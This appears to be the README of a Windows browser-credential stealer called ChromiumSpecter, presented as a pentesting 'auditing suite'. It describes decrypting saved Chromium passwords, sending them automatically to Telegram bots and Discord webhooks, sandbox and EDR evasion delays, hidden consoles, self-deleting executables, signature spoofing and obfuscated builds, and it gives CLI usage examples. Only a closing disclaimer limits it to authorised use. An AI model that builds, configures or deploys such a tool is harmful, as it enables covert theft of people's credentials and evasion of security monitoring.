# 🛡️ ChromiumSpecter Auditor Suite

> [!NOTE]
> **English Version** | [Versión en Español](README.md)

<div align="center">

![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

*The ultimate tactical-grade suite for security audits on Chromium-based browsers.*

[Report Bug](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues) | [Request Feature](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues)

</div>

---

<div align="center">
  <img src="screenshots/dashboard.png" width="800" alt="ChromiumSpecter Dashboard">
</div>

---

## 💻 Capabilities Overview

**ChromiumSpecter** is a credential auditing suite designed for Windows environments, focusing on discretion, automation, and operational ergonomics. It allows for the extraction, decryption, and exfiltration of data from Chromium-based browsers (v80+) with a modular and resilient architecture.

### 🌟 Key Features

* **🖥️ High-Density Dashboard**: Professional graphical interface with real-time consoles, dynamic statistics, and result management.
* **🔐 Dual Decryption Engine**:
  * Simultaneous support for **AES-GCM (Chromium v80+)** and **DPAPI Legacy** in the same profile database.
  * Per-individual blob decryption — a migrated profile can have entries of both types and they are processed correctly without discarding anything.
  * Automatic scheme detection by prefix (`v10`/`v11`) with intelligent fallback to DPAPI if AES fails.
  * Profiles without AES key (old Chrome) continue to be processed in pure DPAPI mode.
* **🕵️ Tactical Stealth Engine**:
  * **Startup Delay**: Initial delay selector (0-300s) to evade analysis in Sandboxes.
  * **Inter-file Delay (`send_delay`)**: Customizable pauses between uploads to prevent traffic spikes that alert firewalls or EDRs.
  * **Anti-Forensics**: Support for **Tactical Self-Destruct** (Auto-Delete) of the binary after execution.
  * **Panic Protocol**: Total sanitization of the audit environment with a single click.
* **🧠 Intelligent Profile Detection**:
  * Differentiated scanning: Chrome/Edge/Brave use subdirectories (`Default`, `Profile N`); Opera/Vivaldi use the root directly.
  * File size validation before processing (avoids false positives with empty DBs).
  * `PermissionError` handling per profile without aborting the entire scan.

<div align="center">
  <img src="screenshots/exit_self-destroy.png" width="600" alt="ChromiumSpecter Panic Exit">
</div>

### 🚀 Smart Exfiltration

* **Auto-Exfiltrate**: Automatic upload configuration immediately after audit.
* **Multi-Channel**: Native support for **Telegram Bots** and **Discord Webhooks** with redundancy.
* **Local Persistence**: Secure saving of exfiltration configurations for recurring use.

### 🛠️ Integrated Visual Builder

Generation of custom stubs with **Dynamic Injection** of parameters.
**Metadata Spoofing**: Integrated presets to clone signatures.
**Compression and Obfuscation**: Native support for UPX and PyArmor.

<div align="center">
  <img src="screenshots/builder.png" width="800" alt="ChromiumSpecter Builder">
</div>

---

## 🚀 Tactical Workflow

1. **Configuration**: Define your Telegram/Discord tokens in the **Exfiltration** Tab and save them.
2. **Audit**: Launch the scan from the Dashboard. You can enable **Auto-exfiltrate** and **Self-Destruct** for a "fire and forget" cycle.
3. **Inspection**: View decrypted credentials in real-time in the **Results** Tab.
4. **Deployment**: Use the **Builder** to generate an `.exe` with your embedded credentials (Base64) and configured stealth presets.

## 🖥️ Advanced Usage (CLI)

The core engine (`main.py`) can run independently without the graphical interface, ideal for automation or quick terminal deployments.

```bash
# Basic audit
python main.py

# Audit with automatic exfiltration to Discord
python main.py --webhook "https://discord.com/api/webhooks/..." --self-destruct

# Silent audit (no console) and saving in custom folder
python main.py --stealth --output-dir "C:\temp\logs"
```

### Available Parameters (CLI)

| Group | Parameter | Description |
| :--- | :--- | :--- |
| **Exfiltration** | `--webhook` | Discord Webhook URL for report uploads. |
| | `--tg-token` | Telegram bot token. |
| | `--tg-chat-id` | Telegram chat or channel ID. |
| | `--no-exfil` | Disables external data upload. |
| **Reports** | `--no-html` | Does not generate the visual HTML report. |
| | `--no-csv` | Does not generate the structured CSV report. |
| | `--json` | Generates an additional report in JSON format. |
| | `--output-dir` | Output folder (default: `.audit`). |
| **Motor** | `--browser` | Filter by specific browser (chrome, brave, etc). |
| | `--delay` | Initial delay (seconds) before acting. |
| | `--stealth` | **Stealth Mode**: Hides the console window immediately upon startup (via Windows API). |
| | `--auto-kill` | Automatically closes browsers if database is locked. |
| | `--self-destruct` | **Deletes the executable** after the cycle finishes. |
| | `--no-wipe` | Does not delete local reports after exfiltrating. |
| | `--clean` | Cleans all old reports in the output folder. |
| | `--debug` | Shows detailed debug logs. |

---

## ⚙️ Compilation Parameters (Stub)

When using the **Builder**, you can inject the following behaviors into your final binary. Options marked with 📡 are only available when the source file is `main.py` or a copy of it.

| Parameter | Range / Option | Purpose |
| :--- | :--- | :--- |
| **Initial Delay** | 0s - 3600s | Delay before the first action (Anti-Sandbox). |
| **Send Delay** | 0s - 60s | Pause between uploaded files (Traffic evasion). |
| **Webhook Timeout** | 1s - 300s | Wait time for unstable connections. |
| **📡 Auto-Exfiltrate** | Checkbox | Enables automatic upload without intervention upon execution. |
| **📡 Stealth Mode** | Runtime Flag | Hides the console at startup (via `ShowWindow` Win32 API). |
| **💥 Self-Destruct** | Checkbox | Deletes the `.exe` after the cycle finishes. |
| **UAC Prompt** | Toggle | Requests administrator privileges if needed. |
| **Obfuscate with PyArmor** | Toggle | Applies source code obfuscation before compiling. |
| **UPX Compression** | Toggle | Compresses the final binary (reduces size ~30-50%). |
| **Show Console** | Compiler Flag | Generates a `Console App`. If unchecked, generates a `Windowed App`. |

> [!TIP]
> **Technical Difference — Show Console vs Stealth Mode**:
> - **Show Console** (Compiler): Determines if the **Operating System** creates the window from scratch. Unchecked = `Windowed App`, there is never a black window.
> - **Stealth Mode** (Runtime): The window is created, but the code hides it in milliseconds using `ShowWindow(0)`. A brief flash might be visible.
> - **Recommendation**: Leave "Show Console" **unchecked** + "Stealth Mode" **checked** for double-layer stealth.


---

## 🛠️ Technology Stack

| Component | Technology |
| :--- | :--- |
| **Core UI** | `CustomTkinter` (Modern Dark Theme) |
| **Cryptography** | `AES-GCM 256` via `PyCryptodomex` + `Windows DPAPI` |
| **OS Security** | `Win32 API` (`CryptUnprotectData`, `ShowWindow`) |
| **Compilation** | `PyInstaller` + `PyArmor` + `UPX` |
| **Persistence** | Local `JSON` (`.audit/exfil_config.json`) |
| **Testing** | `pytest` + `pytest-mock` (18 tests, 0 failures) |

---

## ⚙️ Installation Guide

```bash
# 1. Clone the repository
git clone https://github.com/ANONIMO432HZ/ChromiumSpecter
cd ChromiumSpecter

# 2. Install dependencies
pip install -r requirements.txt

# 3. Launch the Dashboard
python gui_app.py
```

---

## 📡 Exfiltration Setup

### 🤖 Telegram

Requires **Token** and **Chat ID**.

* Get the token with `@BotFather`.
* Get your ID with `@userinfobot`.

### 🎮 Discord

Requires **Webhook URL**.

* Set it up in: Channel Settings -> Integrations -> Webhooks.

---

## 🧪 Quality and Testing

The suite includes a battery of automated tests to ensure the integrity of decryption algorithms and exfiltration channels.

To run the tests, make sure you have the virtual environment activated and run:

```bash
# Run all tests
pytest

# Run with detailed report
pytest -v
```

> [!TIP]
> Tests use `pytest-mock` to simulate network calls and system file access, allowing for safe validations without the risk of real exfiltration during testing.

---

## ⚖️ Legal and Ethical Disclaimer

> [!CAUTION]
> **THIS SOFTWARE IS FOR ETHICAL PENTESTING AND PROFESSIONAL AUDITING PURPOSES.**
> Using this tool to access systems without explicit authorization from the owner is illegal. The author assumes no responsibility for the misuse of this suite.

---

